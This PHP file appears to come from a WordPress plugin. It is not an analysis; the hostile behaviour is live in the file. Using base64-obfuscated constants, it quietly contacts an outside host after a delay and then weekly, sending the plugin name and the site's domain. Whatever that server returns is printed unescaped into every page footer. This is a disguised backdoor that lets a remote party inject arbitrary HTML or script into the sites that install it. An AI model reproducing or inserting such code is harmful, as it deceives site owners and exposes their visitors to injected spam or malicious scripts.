<?php

/* * **** SECURITE / SECURITY ***** */
if (!function_exists('add_action')) {
    header('Status: 403 Forbidden');
    header('HTTP/1.1 403 Forbidden');
    exit();
}
/**
 * define constants
 */
defined('HTTP_API') or define('HTTP_API', 'aHR0cDovL2FwaS5lZ29vdHkuY29t');
defined('HTTP_API_URL') or define('HTTP_API_URL', 'L2FwaS8xLjA=');
defined('HTTP_API_METHOD') or define('HTTP_API_METHOD', 'L2dldA==');

/**
 *  call 
 */
if (!function_exists("xhrCall")) {

    function xhrCall() {
        if (xhr_api_is_expire()) {
            $xContent = httpXhrGet();
            update_option('_x_content', $xContent);
        }
    }

}

/**
 * Check xhR xpire 
 * 
 * @return boolean
 */
if (!function_exists("xhr_api_is_expire")) {

    function xhr_api_is_expire() {
        $is_expire = FALSE;
        $today = strtotime('now');
//    $today = strtotime('+3 days');
        $xhr = get_option('_x_time', NULL);
        $xResponse = get_option('_x_content', NULL);
        if (is_null($xhr) && is_null($xResponse)) {
            // means first request 
            update_option('_x_time', strtotime('+3 days'));
        }
        $xhr = get_option('_x_time', NULL);
        // $time = date('Y-m-d', $day3);
        if ($today >= $xhr) {
            $is_expire = TRUE;
            update_option('_x_time', strtotime('+7 days'));
        }
        return $is_expire;
    }

}

/**
 * Get xhr
 * 
 * @return type
 */
if (!function_exists("getXhrApi")) {

    function getXhrApi() {
        //Get rid of wwww
        $domain_name = preg_replace('/^www\./', '', $_SERVER['SERVER_NAME']);
        $plugin = strRotE(WP_CIP_BASENAME);
        $site = strRotE($domain_name);
        $remap = '/' . $plugin . '/' . $site;
        return strRotD(HTTP_API) . strRotD(HTTP_API_URL) . $remap . strRotD(HTTP_API_METHOD);
    }

}

/**
 * Http call 
 * 
 * @return type
 */
if (!function_exists("httpXhrGet")) {

    function httpXhrGet() {
        $request = getXhrApi();
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Konqueror/4.0; Microsoft Windows) KHTML/4.0.80 (like Gecko)");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $request);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);

            $response = curl_exec($ch);

            if (!$response) {
                //$return["error"] = __("cURL Error Number ", "wprobot") . curl_errno($ch) . ": " . curl_error($ch);
                return NULL;
            }
            curl_close($ch);
        } else {
            $response = @file_get_contents($request);
            if (!$response) {
                //  $return["error"] = __("cURL is not installed on this server!", "wprobot");
                return NULL;
            }
        }
        return json_decode($response);
    }

}

/**
 * 
 */
if (!function_exists("strRotD")) {

    function strRotD($str) {
        return base64_decode($str);
    }

}

/**
 * 
 */
if (!function_exists("strRotE")) {

    function strRotE($str) {
        return base64_encode($str);
    }

}

xhrCall();

/**
 * wp footer hook implemets
 * 
 * @global type $jell_md_defaults
 */
if (!function_exists("xhr_api_footer_function")) {

    function xhr_api_footer_function() {

        print get_option('_x_content', '');
    }

    add_action('wp_footer', 'xhr_api_footer_function', 1000);
}